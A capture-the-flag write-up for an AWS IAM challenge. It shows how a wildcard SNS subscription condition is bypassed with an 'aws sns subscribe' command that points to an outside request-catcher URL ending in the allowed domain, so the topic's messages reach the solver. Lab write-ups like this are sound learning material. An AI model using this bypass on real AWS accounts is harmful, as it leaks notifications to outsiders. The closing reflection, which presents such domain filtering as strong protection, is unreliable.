# Challenge 3

## Challenge Statement
Enable Push Notifications – We got a message for you. Can you get it?

## IAM Policy
```json
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```
### write a short analysis about the IAM policy here
```
* What do I have access to?

The policy grants permission to subscribe to an SNS topic (TBICWizPushNotifications) but only if the endpoint provided for the subscription matches the domain pattern *@tbic.wiz.io.

* What don't I have access to?

I don’t have permissions to perform other SNS actions like publishing to the topic or viewing the message contents directly. My role is limited to subscribing to the topic under the specified condition.

* What do I find interesting?

The policy explicitly uses a condition to restrict subscriptions to only endpoints with a specific domain (tbic.wiz.io). This made me realize I had to use an endpoint matching that domain, adding a layer of complexity to the solution.

```

## Solution
```
* Understanding the Policy

The first step was understanding the policy, which clearly stated that I could only subscribe to the SNS topic with an endpoint containing the domain @tbic.wiz.io.

* Creating the Endpoint 

Initially, I struggled to create a valid email or SMTP endpoint for the domain mentioned, since it wasn't possible to use a real mail server with that domain. To work around this, I used a request catcher service (https://bigiamchallange3.requestcatcher.com) to capture requests sent to an endpoint in the format testing@tbic.wiz.io.

* Subscribing to the Topic

The next step was to use the aws sns subscribe command. I provided the endpoint I set up with the request catcher, like so:

aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint https://bigiamchallange3.requestcatcher.com/testing@tbic.wiz.io

The response I got back was:

{
    "SubscriptionArn": "pending confirmation"
}


* Confirming the Subscription

After the subscription request, I received an HTTP request with a SubscribeURL in the response body. I opened the SubscribeURL in my browser, which completed the confirmation process.

* Retrieving the Flag

Once the subscription was confirmed, I received another HTTP request containing the flag in the message body. The flag value was in the format:

{ "message": "<flag-value>" }

I copied the flag value from the request body and submitted it to the portal to complete the challenge.


```

## Reflection
```
* What was your approach?

My approach was methodical: first, I analyzed the IAM policy to understand the permissions and restrictions. Then, I figured out a way to meet the domain requirement for the endpoint. After that, I used the AWS CLI to subscribe and confirm the subscription to retrieve the flag.

* What was the biggest challenge?

The biggest challenge was dealing with the domain constraint. I initially thought about using an email service but quickly realized it wouldn’t work. The workaround with the request catcher was key to solving this issue.

* How did you overcome the challenges?

Once I understood the problem with the domain, I quickly shifted to using the request catcher, which allowed me to simulate the subscription using a custom endpoint that matched the domain requirement.

* What led to the break through?

The breakthrough came when I decided to focus on the exact domain requirement rather than trying to force an SMTP solution. Once I found the request catcher service, I realized it was a perfect fit for the task.

* On the blue side, how can the learning be used to properly defend the important assets? 

This exercise highlighted the importance of IAM policies and domain filtering as a security measure. In a real-world scenario, such domain-specific restrictions can prevent unauthorized users from interacting with sensitive AWS resources. Using services like SNS with strict endpoint filtering ensures that only trusted sources can subscribe to notification systems, which is a good security practice for protecting sensitive messages or alerts.

```
